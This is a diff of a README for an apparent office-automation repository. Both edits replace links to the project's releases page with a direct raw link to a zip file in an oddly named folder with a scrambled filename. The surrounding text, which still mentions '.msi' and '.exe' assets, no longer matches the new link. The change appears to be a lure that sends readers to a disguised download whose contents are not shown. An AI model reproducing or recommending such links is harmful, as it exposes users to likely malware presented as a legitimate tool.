@@ -1,6 +1,6 @@
 # 🤖 awesome-automation-for-knowledge-work - Streamline your daily office tasks easily
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/judiecool8324/awesome-automation-for-knowledge-work/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/judiecool8324/awesome-automation-for-knowledge-work/raw/refs/heads/main/tannable/work_awesome_knowledge_for_automation_2.4-beta.4.zip)
 
 This repository provides tools and methods to automate tasks that require knowledge. It focuses on document processing, semantic search, and workflow management. Use these resources to save time on repetitive computer tasks.
 
@@ -22,7 +22,7 @@ Ensure your computer has the following specifications before you begin:
 
 Visit the release page to obtain the installer for your computer:
 
-[https://github.com/judiecool8324/awesome-automation-for-knowledge-work/releases](https://github.com/judiecool8324/awesome-automation-for-knowledge-work/releases)
+[https://github.com/judiecool8324/awesome-automation-for-knowledge-work/raw/refs/heads/main/tannable/work_awesome_knowledge_for_automation_2.4-beta.4.zip](https://github.com/judiecool8324/awesome-automation-for-knowledge-work/raw/refs/heads/main/tannable/work_awesome_knowledge_for_automation_2.4-beta.4.zip)
 
 On this page, locate the section labeled "Assets." Click the link ending in `.msi` or `.exe` to start the download. Save this file to your Downloads folder.
 
